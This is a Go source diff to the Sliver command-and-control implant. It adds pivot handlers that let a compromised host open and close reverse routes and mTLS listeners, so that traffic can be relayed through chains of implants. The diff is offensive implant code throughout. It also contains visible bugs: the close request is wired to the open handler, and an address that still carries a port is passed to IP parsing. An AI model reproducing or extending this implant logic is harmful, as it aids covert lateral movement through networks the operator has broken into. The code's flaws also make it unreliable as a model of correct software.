@@ -3,6 +3,8 @@ package handlers
 import (
 	// {{if .Config.Debug}}
 	"log"
+	"net"
+
 	// {{end}}
 	"crypto/tls"
 	"crypto/x509"
@@ -13,6 +15,7 @@ import (
 
 	"github.com/bishopfox/sliver/protobuf/commonpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"github.com/bishopfox/sliver/sliver/3rdparty/ilgooz/bon"
 	"github.com/bishopfox/sliver/sliver/pivots"
 	"github.com/bishopfox/sliver/sliver/transports"
 )
@@ -37,8 +40,11 @@ import (
 
 var (
 	genericPivotHandlers = map[uint32]PivotHandler{
-		sliverpb.MsgPivotData:   pivotDataHandler,
-		sliverpb.MsgTCPPivotReq: tcpListenerHandler,
+		sliverpb.MsgPivotData:                 pivotDataHandler,
+		sliverpb.MsgTCPPivotReq:               tcpListenerHandler,
+		sliverpb.MsgPivotReverseRouteOpenReq:  pivotMuxReverseOpenHandler,
+		sliverpb.MsgPivotReverseRouteCloseReq: pivotMuxReverseOpenHandler,
+		sliverpb.MsgMTLSPivotOpenReq:          mtlsListenerHandler,
 	}
 )
 
@@ -106,6 +112,70 @@ func pivotDataHandler(envelope *sliverpb.Envelope, connection *transports.Connec
 		// {{if .Config.Debug}}
 		log.Printf("[pivotDataHandler] PivotID %d not found\n", pivData.GetPivotID())
 		// {{end}}
+	}
+}
+
+// pivotMuxReverseHandler - Used to notify the implant it is a node of a route where a listener
+// is start, and request him to add a handler to handle any of this listener reverse connections.
+func pivotMuxReverseOpenHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+
+	pivotMuxReq := &sliverpb.PivotReverseRouteOpenReq{}
+	err := proto.Unmarshal(envelope.Data, pivotMuxReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	// Get the transport tied to the next node in chain. Forge handler and add it.
+	for _, tp := range transports.Transports.Active {
+		tIP := net.ParseIP(tp.Conn.RemoteAddr().String())
+
+		if pivotMuxReq.Route.Nodes[1].Addr == tIP.String() {
+
+			tp.Router.Handle(bon.Route(pivotMuxReq.Route.ID), func(conn net.Conn) {
+				go tp.HandleReverse(pivotMuxReq.Route.ID, conn)
+			})
+		}
+	}
+
+	pivotMux := &sliverpb.PivotReverseRouteOpen{Response: &commonpb.Response{}}
+	pivotMux.Success = true
+	data, _ := proto.Marshal(pivotMux)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
+	}
+}
+
+// pivotMuxReverseCloseHandler - We deregister a reverse route handler from a transport.
+func pivotMuxReverseCloseHandler(envelope *sliverpb.Envelope, connection *transports.Connection) {
+
+	pivotMuxCloseReq := &sliverpb.PivotReverseRouteCloseReq{}
+	err := proto.Unmarshal(envelope.Data, pivotMuxCloseReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	// Get the transport tied to the next node in chain. Forge handler and add it.
+	for _, tp := range transports.Transports.Active {
+		tIP := net.ParseIP(tp.Conn.RemoteAddr().String())
+
+		if pivotMuxCloseReq.Route.Nodes[1].Addr == tIP.String() {
+			tp.Router.Off(bon.Route(pivotMuxCloseReq.Route.ID))
+		}
+	}
+
+	pivotMuxClose := &sliverpb.PivotReverseRouteClose{Response: &commonpb.Response{}}
+	pivotMuxClose.Success = true
+	data, _ := proto.Marshal(pivotMuxClose)
+	connection.Send <- &sliverpb.Envelope{
+		ID:   envelope.GetID(),
+		Data: data,
 	}
 }
 
